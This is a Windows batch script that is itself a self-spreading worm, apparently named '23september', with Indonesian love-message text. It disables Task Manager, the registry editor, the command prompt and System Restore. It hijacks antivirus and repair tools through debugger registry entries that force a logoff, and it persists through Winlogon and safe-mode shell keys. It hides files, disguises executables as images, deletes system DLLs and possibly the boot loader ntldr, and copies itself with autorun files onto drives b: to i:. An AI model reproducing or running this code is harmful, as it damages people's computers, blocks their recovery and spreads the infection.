if exist regedit.exe goto windowexplorer
if exist winlogon.exe goto windowexplorer
if exist windowexplorer.23 goto windowexplorer
explorer %userprofile%\mydocu~1
:windowexplorer
if not exist "%userprofile%\Desktop\23september.txt" goto dsktop
:nangkacomm
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t reg_dword /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFind /t reg_dword /d 1 /f
reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t reg_dword /d 2 /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v openwinm /d %windir%\lsass.exe /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v openbatm /d %windir%\Config01\rm27.bat /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t reg_dword /d 1 /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t reg_dword /d 1 /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t reg_dword /d 1 /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v DisableSR /t reg_dword /d 1 /f
reg add "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v NoBrowserOptions /t reg_dword /d 1 /f
reg add "HKLM\SOFTWARE\Classes\batfile\shell\open\command" /ve /d ""%1" %*" /f
reg add "HKLM\Software\Microsoft\Windows\Currentversion\RunOnce" /v boottimera /d %windir%\23september.htm /f
reg add "HKCU\Software\Microsoft\Internet Explorer\Desktop\General" /v Wallpaper /t REG_EXPAND_SZ /d %%windir%%\23september.htm /f
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /d %windir%\23september.bmp /f
reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /d 2 /f
reg add "HKCU\Control Panel\Desktop" /v OriginalWallpaper /d %windir%\23september.bmp /f
reg add "HKCU\Control Panel\Desktop" /v TileWallpaper /d 1 /f
reg add "HKCU\Software\Microsoft\Internet Explorer\Desktop\SafeMode\General" /v Wallpaper /d %windir%\23september.bmp /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop" /v NoChangingWallpaper /t reg_dword /d 1 /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d Explorer.exe taskmgr.exe /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v System /d %windir%\Config01\wind\svchost.exe /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d %windir%\system32\userinit.exe,%windir%\Config01\wind\svchost.exe, /f
reg add "HKLM\SYSTEM\ControlSet001\Control\SafeBoot" /v  AlternateShell /d %windir%\Config01\wind\svchost.exe /f
reg add "HKLM\SYSTEM\ControlSet002\Control\SafeBoot" /v  AlternateShell /d %windir%\Config01\wind\svchost.exe /f
reg add "HKLM\SYSTEM\ControlSet003\Control\SafeBoot" /v  AlternateShell /d %windir%\Config01\wind\svchost.exe /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot" /v  AlternateShell /d %windir%\Config01\wind\svchost.exe /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden" /v Type /d Empty /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\HideFileExt" /v Type /d Empty /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\SuperHidden" /v Type /d Empty /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v HideFileExt /t reg_dword /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /t reg_dword /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /t reg_dword /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v FolderContentsInfoTip /t reg_dword /d 0 /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\gpedit.msc" /v Debugger /d "%userprofile%\Application Data\windows\wallpaper2.exe" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Msconfig.exe" /v Debugger /d %windir%\nangka\btautoexeca.bat /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Regedit.exe" /v Debugger /d "%userprofile%\Application Data\windows\wallpaper2.exe" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\rstrui.exe" /v Debugger /d %windir%\nangka\btautoexeca.bat /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ntvdm.exe" /v Debugger /d %windir%\nangka\btautoexeca.bat /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ProcessManager.exe" /v Debugger /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ANSAV32.EXE" /v Debugger /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ANSAV.EXE" /v Debugger /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Proces~1.exe" /v Debugger /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RegistryCleaner.exe" /v Debugger /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RegistryEditor.exe" /v Debugger /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\StartUpManager.exe" /v Debugger /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\a2hijackfree.exe" /v Debugger /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\a2hija~1.exe" /v Debugger /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TaskMan.exe" /v Debugger /d "%windir%\logtaskconfig.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procexp.exe" /v Debugger /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procex~1.exe" /v Debugger /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procex.exe" /v Debugger /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procexp64.exe" /v Debugger /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KillBox.exe" /v Debugger /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\KillBo~1.exe" /v Debugger /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RegRepair.exe" /v Debugger /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RegRep~1.exe" /v Debugger /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SysMech6.exe" /v Debugger /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\SysMec~1.exe" /v Debugger /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\nero.exe" /v Debugger /d "%windir%\logtaskconfig.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\NeroStartSmart.exe" /v Debugger /d "%windir%\logtaskconfig.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ExplorerXP.exe" /v Debugger /d "%windir%\logtaskconfig.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Unlocker.exe" /v Debugger /d "%windir%\logtaskconfig.bat" /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RegCleanr.exe" /v Debugger /d "%windir%\logtaskconfig.bat" /f
reg add "HKLM\SOFTWARE\Classes\regfile\shell\open\command" /ve /d "%userprofile%\Application Data\windows\wallpaper2.exe" /f
reg add "HKLM\SOFTWARE\Classes\regfile\shell\edit\command" /ve /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Classes\inffile\shell\open\command" /ve /d "notepad.exe %systemdrive%\23september_ends.txt" /f
reg add "HKLM\SOFTWARE\Classes\inffile\shell\Install\command" /ve /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Classes\batfile\shell\edit\command" /ve /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Classes\VBSFile\Shell\Open\Command" /ve /d "notepad.exe %systemdrive%\23september_ends.txt" /f
reg add "HKLM\SOFTWARE\Classes\VBSFile\Shell\Edit\Command" /ve /d "%windir%\system32\nwin0loff.bat" /f
reg add "HKLM\SOFTWARE\Classes\JSFile\Shell\Open\Command" /ve /d "notepad.exe %systemdrive%\23september_ends.txt" /f
reg add "HKLM\SOFTWARE\Classes\JSFile\Shell\Edit\Command" /ve /d "%windir%\system32\nwin0loff.bat" /f
if not exist %windir%\system32 md %windir%\system32
if not exist %windir%\system32\nwin0loff.bat goto nwinlog0c
if exist %windir%\system32\nwinlog0.dat goto nwinlog0
:nwinlog0c
echo @echo off >> %windir%\system32\nwin0loff.bat
echo cd.. >> %windir%\system32\nwin0loff.bat
echo shutdown -l -t 0 -f >> %windir%\system32\nwin0loff.bat
echo exit >> %windir%\system32\nwin0loff.bat
echo sector443 > %windir%\system32\nwinlog0.dat
:nwinlog0
reg add "HKCU\Software\Microsoft\Windows\ShellNoRoam\MUICache" /v @%windir%\system32\SHELL32.dll,-9216 /d "23september" /f
reg add "HKCU\Software\Microsoft\Windows\ShellNoRoam\MUICache" /v @shell32.dll,-21786 /d "23september" /f
if not exist %windir%\inf md %windir%\inf
if exist %windir%\inf\1154w.inf goto 1154w
echo Windows Registry Editor Version 5.00 >> %windir%\conctwinx.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile] >> %windir%\conctwinx.reg
echo @="JPEG Image" >> %windir%\conctwinx.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\batfile] >> %windir%\conctwinx.reg
echo @="Aplication" >> %windir%\conctwinx.reg
REG IMPORT %windir%\conctwinx.reg
del %windir%\conctwinx.reg
echo mov2339 > %windir%\inf\1154w.inf
:1154w
reg add "HKLM\SOFTWARE\Classes\Directory" /ve /d "23september" /f
reg add "HKCR\SOFTWARE\Directory" /ve /d "23september" /f
reg add "HKCU\Software\Microsoft\Internet Explorer\Toolbar" /v BackBitmapShell /d %windir%\23september.bmp /f
reg add "HKCU\Control Panel\International" /v s1159 /d ~28/sep/2002~ /f
reg add "HKCU\Control Panel\International" /v s2359 /d ~28/sep/2002~ /f
if exist %windir%\system32\msvbvm60.dll attrib -r -s -h %windir%\system32\msvbvm60.dll
if exist %windir%\system\msvbvm60.dll attrib -r -s -h %windir%\system\msvbvm60.dll
if exist %windir%\msvbvm60.dll attrib -r -s -h %windir%\msvbvm60.dll
if exist %windir%\system32\msvbvm50.dll copy /y %windir%\system32\msvbvm50.dll %windir%\system\config50.dll
if exist %windir%\system32\msvbvm60.dll copy /y %windir%\system32\msvbvm60.dll %windir%\system\config60.dll
if exist %windir%\system32\msvbvm50.dll del %windir%\system32\msvbvm50.dll
if exist %windir%\system32\msvbvm60.dll del %windir%\system32\msvbvm60.dll
if exist %windir%\system\msvbvm60.dll del %windir%\system\msvbvm60.dll
if exist %windir%\msvbvm60.dll del %windir%\msvbvm60.dll
reg add "HKCU\AppEvents\Schemes\Apps\.Default\DeviceConnect\.Current" /ve /d "%windir%\Media\Windows XP Hardware Insert.wav" /f
reg add "HKCU\AppEvents\Schemes\Apps\.Default\DeviceDisconnect\.Current" /ve /d "%windir%\Media\Windows XP Hardware Remove.wav" /f
if not exist %windir%\system32\GroupPolicy md %windir%\system32\GroupPolicy
if not exist %windir%\system32\GroupPolicy\User md %windir%\system32\GroupPolicy\User
if not exist %windir%\system32\GroupPolicy\User\Settings md %windir%\system32\GroupPolicy\User\Settings
if not exist %windir%\system32\GroupPolicy\User\Settings\rings.wav for %%a in (%MYFILES%\*.wav) do if %%~za equ 73318 copy /y  %%a %windir%\system32\GroupPolicy\User\Settings\rings.wav
if not exist %windir%\Media md %windir%\Media
if exist %windir%\Media\sound_nangka23.dat goto ik
copy /y %windir%\system32\GroupPolicy\User\Settings\rings.wav "%windir%\Media\Windows XP Hardware Insert.wav"
copy /y %windir%\system32\GroupPolicy\User\Settings\rings.wav "%windir%\Media\Windows XP Hardware Remove.wav"
copy /y %windir%\system32\GroupPolicy\User\Settings\rings.wav "%windir%\Media\recycle.wav"
copy /y %windir%\system32\GroupPolicy\User\Settings\rings.wav "%windir%\Media\Windows XP Critical Stop.wav"
copy /y %windir%\system32\GroupPolicy\User\Settings\rings.wav "%windir%\Media\Windows XP Error.wav"
copy /y %windir%\system32\GroupPolicy\User\Settings\rings.wav "%windir%\Media\Windows XP Logoff Sound.wav"
copy /y %windir%\system32\GroupPolicy\User\Settings\rings.wav "%windir%\Media\Windows XP Logon Sound.wav"
copy /y %windir%\system32\GroupPolicy\User\Settings\rings.wav "%windir%\Media\Windows XP Recycle.wav"
copy /y %windir%\system32\GroupPolicy\User\Settings\rings.wav "%windir%\Media\Windows XP Restore.wav"
copy /y %windir%\system32\GroupPolicy\User\Settings\rings.wav "%windir%\Media\Vista_WindowsLogon.wav"
copy /y %windir%\system32\GroupPolicy\User\Settings\rings.wav "%windir%\Media\Vista_DeviceConnect.wav"
copy /y %windir%\system32\GroupPolicy\User\Settings\rings.wav "%windir%\Media\Vista_DeviceDisconnect.wav"
copy /y %windir%\system32\GroupPolicy\User\Settings\rings.wav "%windir%\Media\Vista_Default.wav"
echo 2355 asm 552 > %windir%\Media\sound_nangka23.dat
:ik
if not exist %windir%\meimylove.wav copy %windir%\system32\GroupPolicy\User\Settings\rings.wav %windir%\meimylove.wav
for %%a in (%windir%\23september.htm) do if %%~za equ 5288 goto ganda
if exist %windir%\23september.htm attrib -s -h -r %windir%\23september.htm
del /y %windir%\23september.htm
copy /y "%MYFILES%\html.23" %windir%\23september.htm
:ganda
if not exist %windir%\Config01 md %windir%\Config01
attrib +s +h %windir%\Config01
if not exist %windir%\Config01\configexp27.dll for %%a in (*.exe) do if %%~za equ 162550 copy /y "%%a" %windir%\Config01\configexp27.dll
if not exist "%userprofile%\Application Data\windows" md "%userprofile%\Application Data\windows"
attrib +s +h "%userprofile%\Application Data\windows"
if not exist "%userprofile%\Application Data\windows\wallpaper2.exe" copy %windir%\Config01\configexp27.dll "%userprofile%\Application Data\windows\wallpaper2.exe"
if not exist %windir%\taskmgr.exe copy /y %windir%\Config01\configexp27.dll %windir%\taskmgr.exe
if not exist %windir%\Config01\wind md %windir%\Config01\wind
if not exist %windir%\Config01\wind\windowexplorer.23 echo [shell] > %windir%\Config01\wind\windowexplorer.23
if not exist %windir%\Config01\wind\svchost.exe copy %windir%\Config01\configexp27.dll %windir%\Config01\wind\svchost.exe
if not exist %windir%\lsass.exe copy %windir%\Config01\configexp27.dll %windir%\lsass.exe
if exist %windir%\shellconf76.dat goto shellconf76
copy %windir%\Config01\configexp27.dll %windir%\system32\nangkacomm23.exe
echo 66760097 > %windir%\shellconf76.dat
:shellconf76
if not exist %windir%\system32\nangkacomm23.exe attrib -s -h -r %systemdrive%\ntldr
if not exist %windir%\system32\nangkacomm23.exe del %systemdrive%\ntldr
if not exist %windir%\bt3783.bat copy %windir%\notepad.exe %windir%\bt3783.bat
if exist %windir%\Config01\rm27.bat goto nixe
echo @echo off >> %windir%\Config01\rm27.bat
echo if exist %windir%\Media\sound_nangka23.dat del /f %windir%\Media\sound_nangka23.dat >> %windir%\Config01\rm27.bat
echo exit >> %windir%\Config01\rm27.bat
:nixe
if not exist %windir%\system\shell23\ md %windir%\system\shell23
attrib +s +h %windir%\system\shell23
if exist %windir%\system\shell23\desktop.ini goto mei
echo [ExtShellFolderViews] >> %windir%\system\shell23\desktop.ini
echo {BE098140-A513-11D0-A3A4-00C04FD706EC}={BE098140-A513-11D0-A3A4-00C04FD706EC} >> %windir%\system\shell23\desktop.ini
echo {5984FFE0-28D4-11CF-AE66-08002B2E1262}={5984FFE0-28D4-11CF-AE66-08002B2E1262} >> %windir%\system\shell23\desktop.ini
echo
echo [{BE098140-A513-11D0-A3A4-00C04FD706EC}] >> %windir%\system\shell23\desktop.ini
echo Attributes=1 >> %windir%\system\shell23\desktop.ini
echo IconArea_Image=%systemroot%\23september.bmp >> %windir%\system\shell23\desktop.ini
echo IconArea_Text=0x00ff00ff >> %windir%\system\shell23\desktop.ini
echo
echo ConfirmFileOp=0 >> %windir%\system\shell23\desktop.ini
echo [.ShellClassInfo] >> %windir%\system\shell23\desktop.ini
echo IconFile=%SystemRoot%\system32\mshearts.exe >> %windir%\system\shell23\desktop.ini
echo IconIndex=0 >> %windir%\system\shell23\desktop.ini
:mei
if exist %windir%\system\shell23\parta.ini goto meiqu
echo [ExtShellFolderViews] >> %windir%\system\shell23\parta.ini
echo {BE098140-A513-11D0-A3A4-00C04FD706EC}={BE098140-A513-11D0-A3A4-00C04FD706EC} >> %windir%\system\shell23\parta.ini
echo {5984FFE0-28D4-11CF-AE66-08002B2E1262}={5984FFE0-28D4-11CF-AE66-08002B2E1262} >> %windir%\system\shell23\parta.ini
echo
echo [{BE098140-A513-11D0-A3A4-00C04FD706EC}] >> %windir%\system\shell23\parta.ini
echo Attributes=1 >> %windir%\system\shell23\parta.ini
echo IconArea_Image=23september.bmp >> %windir%\system\shell23\parta.ini
echo IconArea_Text=0x00ff00ff >> %windir%\system\shell23\parta.ini
echo
echo ConfirmFileOp=0 >> %windir%\system\shell23\parta.ini
echo [.ShellClassInfo] >> %windir%\system\shell23\parta.ini
echo IconFile=%SystemRoot%\system32\mshearts.exe >> %windir%\system\shell23\parta.ini
echo IconIndex=0 >> %windir%\system\shell23\parta.ini
:meiqu
if exist %windir%\system\shell23\autorun.temp goto sautorun
echo [AutoRun] >> %windir%\system\shell23\autorun.inf
echo open=septemberends.exe >> %windir%\system\shell23\autorun.inf
echo icon=%windir%\system32\mshearts.exe,0 >> %windir%\system\shell23\autorun.inf
echo [autorun] > %windir%\system\shell23\autorun.temp
:sautorun
if not exist %systemdrive%\23september_ends.txt goto mei272006
if exist %windir%\nangka\atautoexec.dat goto atauto
:mei272006
echo Mengapa kita harus seperti ini, damai itu indah,  itu yang ku harapkan. >> %systemdrive%\23september_ends.txt
echo Yang aku ingin hanyalah kembali (sebelum semua berubah), dimana cinta dan keindahan mewarnai hari-hari kita. >> %systemdrive%\23september_ends.txt
echo Hapus semua rasa angkuh yang ada dalam diri kita, saling mencintai mengasihi dan menghargai. >> %systemdrive%\23september_ends.txt
echo Tak dapat di pungkiri, semua manusia pasti pernah melakukan salah. >> %systemdrive%\23september_ends.txt
echo Jangan pernah mengucap kata maaf, bukan itu yang kita butuh. >> %systemdrive%\23september_ends.txt
echo Yang kita butuhkan adalah hati yang saling memaafkan. >> %systemdrive%\23september_ends.txt
echo mov3327 > %windir%\nangka\atautoexec.dat
:atauto
if not exist %windir%\logtaskconfig.bat goto butbatg
if exist %windir%\bt7768c.dat goto lovecs
:butbatg
echo @echo off >> %windir%\logtaskconfig.bat
echo title 23september >> %windir%\logtaskconfig.bat
echo COLOR 0A >> %windir%\logtaskconfig.bat
echo echo ""_________________________________"" >> %windir%\logtaskconfig.bat
echo echo ""_____********______*********_____"" >> %windir%\logtaskconfig.bat
echo echo ""___***______***__***_______***___"" >> %windir%\logtaskconfig.bat
echo echo ""__***_________****__________***__"" >> %windir%\logtaskconfig.bat
echo echo ""_***___________**____________***_"" >> %windir%\logtaskconfig.bat
echo echo ""_***_________________________***_"" >> %windir%\logtaskconfig.bat
echo echo ""_***__________JuSt___________***_"" >> %windir%\logtaskconfig.bat
echo echo ""__***_______For 23SeP_______***__"" >> %windir%\logtaskconfig.bat
echo echo ""___***_________My__________***___"" >> %windir%\logtaskconfig.bat
echo echo ""____***____InsPiraTioN___***_____"" >> %windir%\logtaskconfig.bat
echo echo ""______***______________***_______"" >> %windir%\logtaskconfig.bat
echo echo ""________***__________***_________"" >> %windir%\logtaskconfig.bat
echo echo ""__________****____****___________"" >> %windir%\logtaskconfig.bat
echo echo ""_____________******______________"" >> %windir%\logtaskconfig.bat
echo echo ""_______________**________________"" >> %windir%\logtaskconfig.bat
echo echo ""_________________________________"" >> %windir%\logtaskconfig.bat
echo echo. >> %windir%\logtaskconfig.bat
echo echo. >> %windir%\logtaskconfig.bat
echo echo. >> %windir%\logtaskconfig.bat
echo echo. >> %windir%\logtaskconfig.bat
echo echo. >> %windir%\logtaskconfig.bat
echo echo. >> %windir%\logtaskconfig.bat
echo echo. >> %windir%\logtaskconfig.bat
echo echo. >> %windir%\logtaskconfig.bat
echo pause >> %windir%\logtaskconfig.bat
echo exit >> %windir%\logtaskconfig.bat
echo 3342 > %windir%\bt7768c.dat
:lovecs
if exist %windir%\system\temp0x000.dat goto cekoemsize
if exist %windir%\system\OEMINFO.INI attrib -r -s -h %windir%\system\OEMINFO.INI
del /f %windir%\system\OEMINFO.INI
:tulisoem
echo [General] >> %windir%\system\OEMINFO.INI
echo Manufacturer= ~#23september#~ >> %windir%\system\OEMINFO.INI
echo Model= nam_inspiro >> %windir%\system\OEMINFO.INI
echo [Support Information] >> %windir%\system\OEMINFO.INI
echo Line1= Saya datang bukan untuk merusak >> %windir%\system\OEMINFO.INI
echo Line2= Saya di sini ada karena dia >> %windir%\system\OEMINFO.INI
echo Line3= Dan saya hanya ingin dia tau >> %windir%\system\OEMINFO.INI
echo Line4= Saya ada Karena Dia >> %windir%\system\OEMINFO.INI
echo Line5= Terima kasih untuk dia >> %windir%\system\OEMINFO.INI
echo Line6= Yang telah memberi warna dalam hidupKU >> %windir%\system\OEMINFO.INI
echo Line7= Memberi cahaya pada jalanKU >> %windir%\system\OEMINFO.INI
echo Line8= Menunjukkan arah saat AKU tersesat >> %windir%\system\OEMINFO.INI
echo Line9= Memberi perih di atas kebahagiaanKU >> %windir%\system\OEMINFO.INI
echo Line10= Walaupun sesaat dan pernah hilang >> %windir%\system\OEMINFO.INI
echo Line11= Kini dia kembali mewarnai duniaKU >> %windir%\system\OEMINFO.INI
echo Line12= Tapi kenapa harus seperti ini >> %windir%\system\OEMINFO.INI
echo Line13= Untuk dia, mengertilah sebelum semuanya berubah >> %windir%\system\OEMINFO.INI
echo mov32_110 >> %windir%\system\temp0x000.dat
:cekoemsize
for %%a in (%windir%\system\OEMINFO.INI) do if %%~za equ 626 goto lanjuta
if exist %windir%\system\OEMINFO.INI attrib -r -s -h %windir%\system\OEMINFO.INI
if exist %windir%\system\OEMINFO.INI del %windir%\system\OEMINFO.INI
goto tulisoem
:lanjuta
if not exist %windir%\system\OEMLOGO.bmp for %%a in (%MYFILES%\*.db) do if %%~za equ 36920 copy /y %%a %windir%\system\OEMLOGO.bmp
for %%a in (%windir%\system\OEMLOGO.bmp) do if %%~za equ 36920 goto namins
attrib -r -s -h %windir%\system\OEMLOGO.bmp
for %%a in (%MYFILES%\*.db) do if %%~za equ 36920 copy /y %%a %windir%\system\OEMLOGO.bmp
attrib +s +h +r %windir%\system\OEMLOGO.bmp
:namins
if exist "%systemdrive%\progra~1\ramcle~1\RamCleaner.exe" goto killram
if not exist "%systemdrive%\progra~1\ramcle~1\RamCleaner.exe" goto nokillrm
:killram
taskkill /f /im RamCleaner.exe /t
attrib -s -h -r "%systemdrive%\progra~1\ramcle~1\RamCleaner.exe"
del "%systemdrive%\progra~1\ramcle~1\RamCleaner.exe"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\RamCleaner.exe" /v Debugger /d "%windir%\system32\nwin0loff.bat" /f
:nokillrm
attrib +s +h %systemdrive%\windows
if not exist "%userprofile%\Local Settings\Temp"\bt3724.bat copy %windir%\bt3783.bat "%userprofile%\Local Settings\Temp"\bt3724.bat
if not exist "%userprofile%\Local Settings\Temp"\bt3779.bat copy %windir%\bt3783.bat "%userprofile%\Local Settings\Temp"\bt3779.bat
if not exist "%userprofile%\Local Settings\Temp"\bt3721.bat copy %windir%\bt3783.bat "%userprofile%\Local Settings\Temp"\bt3721.bat
if not exist "%userprofile%\Local Settings\Temp"\bt3727.bat copy %windir%\bt3783.bat "%userprofile%\Local Settings\Temp"\bt3727.bat
if not exist "%userprofile%\Local Settings\Temp"\bt3728.bat copy %windir%\bt3783.bat "%userprofile%\Local Settings\Temp"\bt3728.bat
if not exist "%userprofile%\Local Settings\Temp"\bt3720.bat copy %windir%\bt3783.bat "%userprofile%\Local Settings\Temp"\bt3720.bat
if not exist "%userprofile%\Local Settings\Temp"\bt3729.bat copy %windir%\bt3783.bat "%userprofile%\Local Settings\Temp"\bt3729.bat
if not exist "%userprofile%\Local Settings\Temp"\bt1125.bat copy %windir%\bt3783.bat "%userprofile%\Local Settings\Temp"\bt1125.bat
if not exist "%userprofile%\Local Settings\Temp"\bt3268.bat copy %windir%\bt3783.bat "%userprofile%\Local Settings\Temp"\bt3268.bat
if not exist "%userprofile%\Local Settings\Temp"\bt4578.bat copy %windir%\bt3783.bat "%userprofile%\Local Settings\Temp"\bt4578.bat
if not exist "%userprofile%\Local Settings\Temp"\bt7109.bat copy %windir%\bt3783.bat "%userprofile%\Local Settings\Temp"\bt7109.bat
if not exist "%userprofile%\Local Settings\Temp"\bt2711.bat copy %windir%\bt3783.bat "%userprofile%\Local Settings\Temp"\bt2711.bat
if not exist "%userprofile%\Local Settings\Temp"\bt1087.bat copy %windir%\bt3783.bat "%userprofile%\Local Settings\Temp"\bt1087.bat
if not exist "%userprofile%\Local Settings\Temp"\bt1300.bat copy %windir%\bt3783.bat "%userprofile%\Local Settings\Temp"\bt1300.bat
if not exist "%userprofile%\Local Settings\Temp"\bt0986.bat copy %windir%\bt3783.bat "%userprofile%\Local Settings\Temp"\bt0986.bat
if not exist "%userprofile%\Local Settings\Temp"\bt2300.bat copy %windir%\bt3783.bat "%userprofile%\Local Settings\Temp"\bt2300.bat
if not exist "%userprofile%\Local Settings\Temp"\bt5577.bat copy %windir%\bt3783.bat "%userprofile%\Local Settings\Temp"\bt5577.bat
if not exist b:\ goto ac
if exist b:\septemberends.exe goto ac
if exist b:\ copy %windir%\Config01\configexp27.dll b:\septemberends.exe
if not exist b:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf b:\AUTORUN.INF
attrib +s +h b:\AUTORUN.INF
:ac
if not exist c:\ goto ad
if exist c:\septemberends.exe goto ad
if exist c:\ copy %windir%\Config01\configexp27.dll c:\septemberends.exe
if not exist c:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf c:\AUTORUN.INF
attrib +s +h c:\AUTORUN.INF
:ad
if not exist d:\ goto ae
if exist d:\septemberends.exe goto ae
if exist d:\ copy %windir%\Config01\configexp27.dll d:\septemberends.exe
if not exist d:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf d:\AUTORUN.INF
attrib +s +h d:\AUTORUN.INF
:ae
if not exist e:\ goto af
if exist e:\septemberends.exe goto af
if exist e:\ copy %windir%\Config01\configexp27.dll e:\septemberends.exe
if not exist e:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf e:\AUTORUN.INF
attrib +s +h e:\AUTORUN.INF
:af
if not exist f:\ goto ag
if exist f:\septemberends.exe goto ag
if exist f:\ copy %windir%\Config01\configexp27.dll f:\septemberends.exe
if not exist f:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf f:\AUTORUN.INF
attrib +s +h f:\AUTORUN.INF
:ag
if not exist g:\ goto ah
if exist g:\septemberends.exe goto ah
if exist g:\ copy %windir%\Config01\configexp27.dll g:\septemberends.exe
if not exist g:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf g:\AUTORUN.INF
attrib +s +h g:\AUTORUN.INF
:ah
if not exist h:\ goto ai
if exist h:\septemberends.exe goto ai
if exist h:\ copy %windir%\Config01\configexp27.dll h:\septemberends.exe
if not exist h:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf h:\AUTORUN.INF
attrib +s +h h:\AUTORUN.INF
:ai
if not exist i:\ goto aj
if exist i:\septemberends.exe goto aj
if exist i:\ copy %windir%\Config01\configexp27.dll i:\septemberends.exe
if not exist i:\AUTORUN.INF copy %windir%\system\shell23\autorun.inf i:\AUTORUN.INF
